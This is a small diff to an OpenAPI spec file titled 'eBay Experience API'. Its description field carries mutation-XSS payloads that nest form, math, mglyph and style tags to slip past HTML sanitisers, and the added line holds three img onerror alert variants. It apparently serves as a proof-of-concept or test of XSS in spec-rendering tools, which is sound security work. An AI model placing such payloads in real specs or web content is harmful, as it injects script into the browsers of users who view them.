@@ -3,7 +3,7 @@
   "info": {
     "title": "eBay Experience API",
     "version": "1.0.0",
-    "description": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert('XSS on '+document.domain)>"
+    "description": "ZQXSPEC-LOADED <form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert('XSS on '+document.domain)><math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS2 '+document.domain)><svg></p><style><a id='</style><img src=x onerror=alert(\"XSS3 \"+document.domain)>'>"
   },
   "paths": {}
 }
